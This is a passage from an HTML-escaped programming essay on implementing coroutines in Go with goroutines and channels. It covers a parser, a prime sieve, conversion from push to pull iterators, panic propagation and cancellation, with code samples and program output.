{&#xA;    if t != nil {&#xA;        t.left.All(yield)&#xA;        yield(t.value)&#xA;        t.right.All(yield)&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That iterator can be invoked today as:&#xA;&lt;pre&gt;t.All(func(v V) {&#xA;    fmt.Println(v)&#xA;})&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;and perhaps a variant could be invoked in a future version of Go as:&#xA;&lt;pre&gt;for v := range t.All {&#xA;    fmt.Println(v)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Sometimes, however, we want to iterate over a collection&#xA;in a way that doesn’t fit a single &lt;code&gt;for&lt;/code&gt; loop.&#xA;The binary tree comparison is an example of this:&#xA;the two iterations need to be interlaced somehow.&#xA;As we’ve already seen, coroutines would provide an answer,&#xA;letting us turn a function like &lt;code&gt;(*Tree).All&lt;/code&gt; (a “push” iterator)&#xA;into a function that returns a stream of values, one per call&#xA;(a “pull” iterator).&#xA;&lt;a class=anchor href=&#34;#how&#34;&gt;&lt;h2 id=&#34;how&#34;&gt;How to Implement Coroutines in Go&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we are to add coroutines to Go, we should aim to do it without language changes.&#xA;That means the definition of coroutines should be possible to implement&#xA;and understand in terms of ordinary Go code.&#xA;Later, I will argue for an optimized implementation provided directly by the runtime,&#xA;but that implementation should be indistinguishable from the pure Go definition.&#xA;&#xA;&lt;p&gt;&#xA;Let’s start with a very simple version that ignores the yield operation entirely.&#xA;It just runs a function in another goroutine:&#xA;&lt;pre&gt;package coro&#xA;&#xA;func New[In, Out any](f func(In) Out) (resume func(In) Out) {&#xA;    cin := make(chan In)&#xA;    cout := make(chan Out)&#xA;    resume = func(in In) Out {&#xA;        cin &amp;lt;- in&#xA;        return &amp;lt;-cout&#xA;    }&#xA;    go func() { cout &amp;lt;- f(&amp;lt;-cin) }()&#xA;    return resume&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;New&lt;/code&gt; takes a function &lt;code&gt;f&lt;/code&gt; which must have one argument and one result.&#xA;&lt;code&gt;New&lt;/code&gt; allocates channels, defines &lt;code&gt;resume&lt;/code&gt;,&#xA;creates a goroutine to run &lt;code&gt;f&lt;/code&gt;,&#xA;and returns the &lt;code&gt;resume&lt;/code&gt; funtion.&#xA;The new goroutine blocks on &lt;code&gt;&amp;lt;-cin&lt;/code&gt;,&#xA;so there is no opportunity for parallelism.&#xA;The &lt;code&gt;resume&lt;/code&gt; function unblocks the&#xA;new goroutine by sending an &lt;code&gt;in&lt;/code&gt; value and then&#xA;blocks receiving an &lt;code&gt;out&lt;/code&gt; value.&#xA;This send-receive pair makes a coroutine switch.&#xA;We can use &lt;code&gt;coro.New&lt;/code&gt; like this (&lt;a href=&#34;https://go.dev/play/p/gLhqAutT9Q4&#34;&gt;full code&lt;/a&gt;):&#xA;&lt;pre&gt;func main() {&#xA;    resume := coro.New(strings.ToUpper)&#xA;    fmt.Println(resume(&#34;hello world&#34;))&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;So far, &lt;code&gt;coro.New&lt;/code&gt; is just a clunky way to call a function.&#xA;We need to add &lt;code&gt;yield&lt;/code&gt;, which we can pass as an argument to &lt;code&gt;f&lt;/code&gt;:&#xA;&lt;pre&gt;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) Out) {&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cin := make(chan In)&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cout := make(chan Out)&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    resume = func(in In) Out {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        cin &amp;lt;- in&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return &amp;lt;-cout&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;    yield := func(out Out) In {&#xA;        cout &amp;lt;- out&#xA;        return &amp;lt;-cin&#xA;    }&#xA;    go func() { cout &amp;lt;- f(&amp;lt;-cin, yield) }()&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    return resume&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Note that there is still no parallelism here: &lt;code&gt;yield&lt;/code&gt; is another send-receive pair.&#xA;These goroutines are constrained by the communication pattern&#xA;to act indistinguishably from coroutines.&#xA;&lt;a class=anchor href=&#34;#parser&#34;&gt;&lt;h2 id=&#34;parser&#34;&gt;Example: String Parser&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Before we build up to iterator conversion, let’s look at a few simpler examples.&#xA;In “&lt;a href=&#34;pcdata&#34;&gt;Storing Data in Control Flow&lt;/a&gt;,” we considered the problem of&#xA;taking a function&#xA;&lt;pre&gt;func parseQuoted(read func() byte) bool&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;and running it in a separate control flow so that bytes can be provided one&#xA;at a time to a &lt;code&gt;Write&lt;/code&gt; method. Instead of the ad hoc channel-based implementation&#xA;in that post, we can use:&#xA;&lt;pre&gt;type parser struct {&#xA;    resume func(byte) Status&#xA;}&#xA;&#xA;func (p *parser) Init() {&#xA;    coparse := func(_ byte, yield func(Status) byte) Status {&#xA;        read := func() byte { return yield(NeedMoreInput) }&#xA;        if !parseQuoted(read) {&#xA;            return BadInput&#xA;        }&#xA;        return Success&#xA;    }&#xA;    p.resume = coro.New(coparse)&#xA;    p.resume(0)&#xA;}&#xA;&#xA;func (p *parser) Write(c byte) Status {&#xA;    return p.resume(c)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;Init&lt;/code&gt; funtion does all the work, and not much.&#xA;It defines a function &lt;code&gt;coparse&lt;/code&gt; that has the signature needed by &lt;code&gt;coro.New&lt;/code&gt;,&#xA;which means adding a throwaway input of type &lt;code&gt;byte&lt;/code&gt;.&#xA;That function defines a &lt;code&gt;read&lt;/code&gt; that yields &lt;code&gt;NeedMoreInput&lt;/code&gt;&#xA;and then returns the byte provided by the caller.&#xA;It then runs &lt;code&gt;parseQuoted(read)&lt;/code&gt;, converting the boolean result&#xA;to the usual status code.&#xA;Having created a coroutine for &lt;code&gt;coparse&lt;/code&gt; using &lt;code&gt;coro.New&lt;/code&gt;,&#xA;&lt;code&gt;Init&lt;/code&gt; calls &lt;code&gt;p.resume(0)&lt;/code&gt; to allow &lt;code&gt;coparse&lt;/code&gt; to advance&#xA;to the first read in &lt;code&gt;parseQuoted&lt;/code&gt;.&#xA;Finally the &lt;code&gt;Write&lt;/code&gt; method is a trivial wrapper around &lt;code&gt;p.resume&lt;/code&gt; (&lt;a href=&#34;https://go.dev/play/p/MNGVPk11exV&#34;&gt;full code&lt;/a&gt;).&#xA;&#xA;&lt;p&gt;&#xA;This setup abstracts away the pair of channels that we&#xA;maintained by hand in the previous post, allowing us to work&#xA;at a higher level as we write the program.&#xA;&lt;a class=anchor href=&#34;#sieve&#34;&gt;&lt;h2 id=&#34;sieve&#34;&gt;Example: Prime Sieve&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;As a slightly larger example, consider &lt;a href=&#34;https://www.cs.dartmouth.edu/~doug/sieve/sieve.pdf&#34;&gt;Doug McIlroy’s concurrent prime sieve&lt;/a&gt;.&#xA;It consists of a pipeline of coroutines, one for each prime &lt;code&gt;p&lt;/code&gt;, each running:&#xA;&lt;pre&gt;loop:&#xA;    n = get a number from left neighbor&#xA;    if (p does not divide n)&#xA;        pass n to right neighbor&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A counting coroutine on the leftmost side of the pipeline feeds the numbers 2, 3, 4, ... into the left end of the pipeline.&#xA;A printing coroutines on the rightmost side can read primes out, print them, and create new filtering coroutines.&#xA;The first filter in the pipeline removes multiples of 2, the next removes multiples of 3, the next removes multiples of 5, and so on.&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;coro.New&lt;/code&gt; primitive we’ve created lets us take a straightforward loop that yields values&#xA;and convert it into a function that can be called to obtain each value one at a time.&#xA;Here is the counter:&#xA;&lt;pre&gt;func counter() func(bool) int {&#xA;    return coro.New(func(more bool, yield func(int) bool) int {&#xA;        for i := 2; more; i++ {&#xA;            more = yield(i)&#xA;        }&#xA;        return 0&#xA;    })&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The counter logic is the function literal passed to &lt;code&gt;New&lt;/code&gt;.&#xA;It takes a yield function of type &lt;code&gt;func(int)&lt;/code&gt; &lt;code&gt;bool&lt;/code&gt;.&#xA;The code yields a value by passing it to &lt;code&gt;yield&lt;/code&gt; and then receives back a boolean&#xA;saying whether to continue generating more numbers.&#xA;When told to stop, either because &lt;code&gt;more&lt;/code&gt; was false on entry&#xA;or because a &lt;code&gt;yield&lt;/code&gt; call returned false,&#xA;the loop ends.&#xA;It returns a final, ignored value, to satisfy the function&#xA;type required by &lt;code&gt;New&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;New&lt;/code&gt; turns this into loop a function that is the inverse of &lt;code&gt;yield&lt;/code&gt;: a &lt;code&gt;func(bool)&lt;/code&gt; &lt;code&gt;int&lt;/code&gt;&#xA;that can be called with true to obtain the next value or with false to shut down&#xA;the generator.&#xA;The filtering coroutine is only slightly more complex:&#xA;&lt;pre&gt;func filter(p int, next func(bool) int) (filtered func(bool) int) {&#xA;    return coro.New(func(more bool, yield func(int) bool) int {&#xA;        for more {&#xA;            n := next(true)&#xA;            if n%p != 0 {&#xA;                more = yield(n)&#xA;            }&#xA;        }&#xA;        return next(false)&#xA;    })&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;It takes a prime &lt;code&gt;p&lt;/code&gt; and a &lt;code&gt;next&lt;/code&gt; func connected to the coroutine on the left&#xA;and then returns the filtered output stream to connect to the coroutine on the right.&#xA;&#xA;&lt;p&gt;&#xA;Finally we have the printing coroutine:&#xA;&lt;pre&gt;func main() {&#xA;    next := counter()&#xA;    for i := 0; i &amp;lt; 10; i++ {&#xA;        p := next(true)&#xA;        fmt.Println(p)&#xA;        next = filter(p, next)&#xA;    }&#xA;    next(false)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Starting with the counter, &lt;code&gt;main&lt;/code&gt; maintains in &lt;code&gt;next&lt;/code&gt; the output&#xA;of the pipeline constructed so far.&#xA;Then it loops: read a prime &lt;code&gt;p&lt;/code&gt;, print &lt;code&gt;p&lt;/code&gt;, and then add a new&#xA;filter on the right end of the pipeline to remove multiples of &lt;code&gt;p&lt;/code&gt; (&lt;a href=&#34;https://go.dev/play/p/3OHQ_FHe_Na&#34;&gt;full code&lt;/a&gt;).&#xA;&#xA;&lt;p&gt;&#xA;Notice that the calling relationship between coroutines can change over time:&#xA;any coroutine C can call another coroutine D’s &lt;code&gt;next&lt;/code&gt; function and become the&#xA;coroutine that D yields to.&#xA;The counter’s first &lt;code&gt;yield&lt;/code&gt; goes to &lt;code&gt;main&lt;/code&gt;, while its subsequent &lt;code&gt;yield&lt;/code&gt;s&#xA;go to the 2-filter.&#xA;Similarly each &lt;code&gt;p&lt;/code&gt;-filter &lt;code&gt;yield&lt;/code&gt;s its first output (the next prime) to &lt;code&gt;main&lt;/code&gt;&#xA;while its subsequent &lt;code&gt;yield&lt;/code&gt;s go to the filter for that next prime.&#xA;&lt;a class=anchor href=&#34;#goroutines&#34;&gt;&lt;h2 id=&#34;goroutines&#34;&gt;Coroutines and Goroutines&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In a certain sense, it is a misnomer to call these control flows coroutines.&#xA;They are full goroutines, and they can do everything an ordinary&#xA;goroutine can, including block waiting for mutexes, channels,&#xA;system calls, and so on.&#xA;What &lt;code&gt;coro.New&lt;/code&gt; does is create goroutines&#xA;with access to coroutine switch operations&#xA;inside the &lt;code&gt;yield&lt;/code&gt; and &lt;code&gt;resume&lt;/code&gt; functions (which the sieve calls &lt;code&gt;next&lt;/code&gt;).&#xA;The ability to use those operations can even be passed to&#xA;different goroutines, which is happening with &lt;code&gt;main&lt;/code&gt; handing off&#xA;each of its &lt;code&gt;next&lt;/code&gt; streams to each successive &lt;code&gt;filter&lt;/code&gt; goroutine.&#xA;Unlike the &lt;code&gt;go&lt;/code&gt; statement, &lt;code&gt;coro.New&lt;/code&gt; adds new concurrency to the program&#xA;&lt;i&gt;without&lt;/i&gt; new parallelism.&#xA;The goroutine that &lt;code&gt;coro.New(f)&lt;/code&gt; creates can only run&#xA;when some other goroutine explicitly loans it the&#xA;ability to run using &lt;code&gt;resume&lt;/code&gt;; that loan is repaid by &lt;code&gt;yield&lt;/code&gt;&#xA;or by &lt;code&gt;f&lt;/code&gt; returning.&#xA;If you have just one main goroutine&#xA;and run 10 &lt;code&gt;go&lt;/code&gt; statements, then all 11 goroutines can be running at once.&#xA;In contrast, if you have one main goroutine&#xA;and run 10 &lt;code&gt;coro.New&lt;/code&gt; calls, there are now 11 control flows&#xA;but the parallelism of the program is what it was before: only one runs at a time.&#xA;Exactly which goroutines are paused in coroutine operations&#xA;can vary as the program runs, but the parallelism never increases.&#xA;&#xA;&lt;p&gt;&#xA;In short, &lt;code&gt;go&lt;/code&gt; creates a new concurrent, &lt;i&gt;parallel&lt;/i&gt; control flow,&#xA;while &lt;code&gt;coro.New&lt;/code&gt; creates a new concurrent, &lt;i&gt;non-parallel&lt;/i&gt; control flow.&#xA;It is convenient to continue to talk about the non-parallel control flows&#xA;as coroutines, but remember that exactly which goroutines are&#xA;“non-parallel” can change over the execution of a program,&#xA;exactly the same way that which goroutines are receiving or sending from channels&#xA;can change over the execution of a program.&#xA;&lt;a class=anchor href=&#34;#resume&#34;&gt;&lt;h2 id=&#34;resume&#34;&gt;Robust Resumes&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;There are a few improvements we can make to &lt;code&gt;coro.New&lt;/code&gt; so that it works better in real programs.&#xA;The first is to allow &lt;code&gt;resume&lt;/code&gt; to be called after the function is done: right now it deadlocks.&#xA;Let’s add a bool result indicating whether &lt;code&gt;resume&lt;/code&gt;’s result came from a yield.&#xA;The &lt;code&gt;coro.New&lt;/code&gt; implementation we have so far is:&#xA;&lt;pre&gt;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) Out) {&#xA;    cin := make(chan In)&#xA;    cout := make(chan Out)&#xA;    resume = func(in In) Out {&#xA;        cin &amp;lt;- in&#xA;        return &amp;lt;-cout&#xA;    }&#xA;    yield := func(out Out) In {&#xA;        cout &amp;lt;- out&#xA;        return &amp;lt;-cin&#xA;    }&#xA;    go func() {&#xA;        cout &amp;lt;- f(&amp;lt;-cin, yield)&#xA;    }()&#xA;    return resume&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;To add this extra result, we need to track whether &lt;code&gt;f&lt;/code&gt; is running&#xA;and return that result from &lt;code&gt;resume&lt;/code&gt;:&#xA;&lt;pre&gt;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) (Out, bool)) {&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cin := make(chan In)&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cout := make(chan Out)&lt;/span&gt;&#xA;    running := true&#xA;    resume = func(in In) (out Out, ok bool) {&#xA;        if !running {&#xA;            return&#xA;        }&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        cin &amp;lt;- in&lt;/span&gt;&#xA;        out = &amp;lt;-cout&#xA;        return out, running&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    yield := func(out Out) In {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        cout &amp;lt;- out&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return &amp;lt;-cin&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    go func() {&lt;/span&gt;&#xA;        out := f(&amp;lt;-cin, yield)&#xA;        running = false&#xA;        cout &amp;lt;- out&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    return resume&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Note that since &lt;code&gt;resume&lt;/code&gt; can only run when the calling goroutine is blocked,&#xA;and vice versa, sharing the &lt;code&gt;running&lt;/code&gt; variable is not a race.&#xA;The two are synchronizing by taking turns executing.&#xA;If &lt;code&gt;resume&lt;/code&gt; is called after the coroutine has exited, &lt;code&gt;resume&lt;/code&gt; returns a zero value and false.&#xA;&#xA;&lt;p&gt;&#xA;Now we can tell when a goroutine is done (&lt;a href=&#34;https://go.dev/play/p/Y2tcF-MHeYS&#34;&gt;full code&lt;/a&gt;):&#xA;&lt;pre&gt;func main() {&#xA;    resume := coro.New(func(_ int, yield func(string) int) string {&#xA;        yield(&#34;hello&#34;)&#xA;        yield(&#34;world&#34;)&#xA;        return &#34;done&#34;&#xA;    })&#xA;    for i := 0; i &amp;lt; 4; i++ {&#xA;        s, ok := resume(0)&#xA;        fmt.Printf(&#34;%q %v\n&#34;, s, ok)&#xA;    }&#xA;}&#xA;&#xA;&#xA;$ go run cohello.go&#xA;&#34;hello&#34; true&#xA;&#34;world&#34; true&#xA;&#34;done&#34; false&#xA;&#34;&#34; false&#xA;$&#xA;&lt;/pre&gt;&#xA;&lt;a class=anchor href=&#34;#iterator&#34;&gt;&lt;h2 id=&#34;iterator&#34;&gt;Example: Iterator Conversion&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The prime sieve example showed direct use of &lt;code&gt;coro.New&lt;/code&gt;,&#xA;but the &lt;code&gt;more bool&lt;/code&gt; argument was a bit awkward and does not&#xA;match the iterator functions we saw before.&#xA;Let’s look at converting any push iterator into a pull iterator&#xA;using &lt;code&gt;coro.New&lt;/code&gt;.&#xA;We will need a way to terminate the coroutine running&#xA;the push iterator if we want to stop early, so we will add a boolean&#xA;result from &lt;code&gt;yield&lt;/code&gt; indicating whether to continue,&#xA;just like in the prime sieve:&#xA;&lt;pre&gt;push func(yield func(V) bool)&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The goal of the new function &lt;code&gt;coro.Pull&lt;/code&gt; is to turn that push function&#xA;into a pull iterator. The iterator will return the next value&#xA;and a boolean indicating whether the iteration is over,&#xA;just like a channel receive or map lookup:&#xA;&lt;pre&gt;pull func() (V, bool)&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we want to stop the push iteration early, we need some&#xA;way to signal that, so &lt;code&gt;Pull&lt;/code&gt; will return not just the pull&#xA;function but also a stop function:&#xA;&lt;pre&gt;stop func()&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Putting those together, the full signature of &lt;code&gt;Pull&lt;/code&gt; is:&#xA;&lt;pre&gt;func Pull[V any](push func(yield func(V) bool)) (pull func() (V, bool), stop func()) {&#xA;    ...&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The first thing &lt;code&gt;Pull&lt;/code&gt; needs to do is start a coroutine to run the push iterator,&#xA;and to do that it needs a wrapper function with the right type,&#xA;namely one that takes a &lt;code&gt;more bool&lt;/code&gt; to match the bool result from &lt;code&gt;yield&lt;/code&gt;,&#xA;and that returns a final &lt;code&gt;V&lt;/code&gt;.&#xA;The &lt;code&gt;pull&lt;/code&gt; function can call &lt;code&gt;resume(true)&lt;/code&gt;, while the &lt;code&gt;stop&lt;/code&gt; function can call &lt;code&gt;resume(false)&lt;/code&gt;:&#xA;&lt;pre&gt;func Pull[V any](push func(yield func(V) bool)) (pull func() (V, bool), stop func()) {&#xA;    copush := func(more bool, yield func(V) bool) V {&#xA;        if more {&#xA;            push(yield)&#xA;        }&#xA;        var zero V&#xA;        return zero&#xA;    }&#xA;    resume := coro.New(copush)&#xA;    pull = func() (V, bool) {&#xA;        return resume(true)&#xA;    }&#xA;    stop = func() {&#xA;        resume(false)&#xA;    }&#xA;    return pull, stop&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;That’s the complete implementation.&#xA;With the power of &lt;code&gt;coro.New&lt;/code&gt;, it took very little code and effort to build a nice iterator converter.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;To use &lt;code&gt;coro.Pull&lt;/code&gt;, we need to redefine the tree’s &lt;code&gt;All&lt;/code&gt; method&#xA;to expect and use the new &lt;code&gt;bool&lt;/code&gt; result from &lt;code&gt;yield&lt;/code&gt;:&#xA;&lt;pre&gt;func (t *Tree[V]) All(yield func(v V) bool) {&#xA;    t.all(yield)&#xA;}&#xA;&#xA;func (t *Tree[V]) all(yield func(v V) bool) bool {&#xA;    return t == nil ||&#xA;        t.Left.all(yield) &amp;amp;&amp;amp; yield(t.Value) &amp;amp;&amp;amp; t.Right.all(yield)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now we have everything we need to write a tree comparison function in Go (&lt;a href=&#34;https://go.dev/play/p/hniFxnbXTgH&#34;&gt;full code&lt;/a&gt;):&#xA;&lt;pre&gt;func cmp[V comparable](t1, t2 *Tree[V]) bool {&#xA;    next1, stop1 := coro.Pull(t1.All)&#xA;    next2, stop2 := coro.Pull(t2.All)&#xA;    defer stop1()&#xA;    defer stop2()&#xA;    for {&#xA;        v1, ok1 := next1()&#xA;        v2, ok2 := next2()&#xA;        if v1 != v2 || ok1 != ok2 {&#xA;            return false&#xA;        }&#xA;        if !ok1 &amp;amp;&amp;amp; !ok2 {&#xA;            return true&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;a class=anchor href=&#34;#panic&#34;&gt;&lt;h2 id=&#34;panic&#34;&gt;Propagating Panics&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Another improvement is to pass panics from a coroutine back to its caller,&#xA;meaning the coroutine that most recently called &lt;code&gt;resume&lt;/code&gt; to run it&#xA;(and is therefore sitting blocked in &lt;code&gt;resume&lt;/code&gt; waiting for it).&#xA;Some mechanism to inform one goroutine when another panics is a very common request,&#xA;but in general that can be difficult, because we don’t know which&#xA;goroutine to inform and whether it is ready to hear that message.&#xA;In the case of coroutines, we have the caller blocked waiting for news,&#xA;so it makes sense to deliver news of the panic.&#xA;&#xA;&lt;p&gt;&#xA;To do that, we can add a &lt;code&gt;defer&lt;/code&gt; to catch a panic in the new coroutine&#xA;and trigger it again in the &lt;code&gt;resume&lt;/code&gt; that is waiting.&#xA;&lt;pre&gt;type msg[T any] struct {&#xA;    panic any&#xA;    val   T&#xA;}&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) (Out, bool)) {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cin := make(chan In)&lt;/span&gt;&#xA;    cout := make(chan msg[Out])&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    running := true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    resume = func(in In) (out Out, ok bool) {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if !running {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        cin &amp;lt;- in&lt;/span&gt;&#xA;        m := &amp;lt;-cout&#xA;        if m.panic != nil {&#xA;            panic(m.panic)&#xA;        }&#xA;        return m.val, running&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    yield := func(out Out) In {&lt;/span&gt;&#xA;        cout &amp;lt;- msg[Out]{val: out}&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        return &amp;lt;-cin&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    go func() {&lt;/span&gt;&#xA;        defer func() {&#xA;            if running {&#xA;                running = false&#xA;                cout &amp;lt;- msg[Out]{panic: recover()}&#xA;            }&#xA;        }()&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        out := f(&amp;lt;-cin, yield)&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        running = false&lt;/span&gt;&#xA;        cout &amp;lt;- msg[Out]{val: out}&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }()&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    return resume&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Let’s test it out (&lt;a href=&#34;https://go.dev/play/p/Sihm8KVlTIB&#34;&gt;full code&lt;/a&gt;):&#xA;&lt;pre&gt;func main() {&#xA;    defer func() {&#xA;        if e := recover(); e != nil {&#xA;            fmt.Println(&#34;main panic:&#34;, e)&#xA;            panic(e)&#xA;        }&#xA;    }()&#xA;    next, _ := coro.Pull(func(yield func(string) bool) {&#xA;        yield(&#34;hello&#34;)&#xA;        panic(&#34;world&#34;)&#xA;    })&#xA;    for {&#xA;        fmt.Println(next())&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The new coroutine yields &lt;code&gt;hello&lt;/code&gt; and then panics &lt;code&gt;world&lt;/code&gt;.&#xA;That panic is propagated back to the main goroutine,&#xA;which prints the value and repanics.&#xA;We can see that the panic appears to originate in the call to &lt;code&gt;resume&lt;/code&gt;:&#xA;&lt;pre&gt;% go run coro.go&#xA;hello true&#xA;main panic: world&#xA;panic: world [recovered]&#xA;    panic: world&#xA;&#xA;goroutine 1 [running]:&#xA;main.main.func1()&#xA;    /tmp/coro.go:9 +0x95&#xA;panic({0x108f360?, 0x10c2cf0?})&#xA;    /go/src/runtime/panic.go:1003 +0x225&#xA;main.coro_New[...].func1()&#xA;    /tmp/coro.go.go:55 +0x91&#xA;main.Pull[...].func2()&#xA;    /tmp/coro.go.go:31 +0x1c&#xA;main.main()&#xA;    /tmp/coro.go.go:17 +0x52&#xA;exit status 2&#xA;%&#xA;&lt;/pre&gt;&#xA;&lt;a class=anchor href=&#34;#cancel&#34;&gt;&lt;h2 id=&#34;cancel&#34;&gt;Cancellation&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Panic propagation takes care of telling the caller about an early coroutine exit,&#xA;but what about telling a coroutine about an early caller exit?&#xA;Analogous to the &lt;code&gt;stop&lt;/code&gt; function in the pull iterator,&#xA;we need some way to signal to the coroutine that it’s no longer needed,&#xA;perhaps because the caller is panicking, or perhaps because the caller&#xA;is simply returning.&#xA;&#xA;&lt;p&gt;&#xA;To do that, we can change &lt;code&gt;coro.New&lt;/code&gt; to return not just &lt;code&gt;resume&lt;/code&gt; but&#xA;also a &lt;code&gt;cancel&lt;/code&gt; func.&#xA;Calling &lt;code&gt;cancel&lt;/code&gt; will be like &lt;code&gt;resume&lt;/code&gt;, except that &lt;code&gt;yield&lt;/code&gt; panics instead of returning a value.&#xA;If a coroutine panics in a different way during cancellation,&#xA;we want &lt;code&gt;cancel&lt;/code&gt; to propagate that panic, just as &lt;code&gt;resume&lt;/code&gt; does.&#xA;But of course we don’t want &lt;code&gt;cancel&lt;/code&gt; to propagate its own panic,&#xA;so we create a unique panic value we can check for.&#xA;We also have to handle a cancellation in before &lt;code&gt;f&lt;/code&gt; begins.&#xA;&lt;pre&gt;var ErrCanceled = errors.New(&amp;#34;coroutine canceled&amp;#34;)&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;func New[In, Out any](f func(in In, yield func(Out) In) Out) (resume func(In) (Out, bool), cancel func()) {&#xA;    cin := make(chan msg[In])&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    cout := make(chan msg[Out])&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    running := true&lt;/span&gt;&#xA;&lt;span 